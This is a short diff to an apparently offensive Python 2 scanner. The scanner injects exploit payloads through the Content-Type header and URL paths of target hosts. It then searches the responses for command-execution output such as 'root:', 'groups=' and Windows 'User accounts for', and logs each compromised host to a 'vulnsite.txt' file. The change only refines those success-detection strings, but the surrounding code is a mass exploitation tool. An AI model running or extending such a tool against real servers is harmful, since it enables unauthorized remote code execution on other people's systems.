@@ -120,7 +120,7 @@ if len(host) > 0:
 				req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(valida))})
 				result = urllib2.urlopen(req).read()
 
-			  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find(" netmask ") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
+			  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find(" netmask ") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("User accounts for") != -1 or result.find("de usuario de") != -1:
 			  		print RED+"   [-] VULNERABLE"+ENDC
 			  		owned = open('vulnsite.txt', 'a')
 					owned.write(str(host)+'\n')
@@ -170,7 +170,7 @@ if len(host) > 0:
 			try:
 				result = requests.get(site+"/"+exploit3(str(valida))+file_path).text
 
-				if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find(" netmask ") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
+				if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find(" netmask ") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("User accounts for") != -1 or result.find("de usuario de") != -1:
 			  		print RED+"   [-] VULNERABLE"+ENDC
 			  		owned = open('vulnsite.txt', 'a')
 					owned.write(str(host)+'\n')
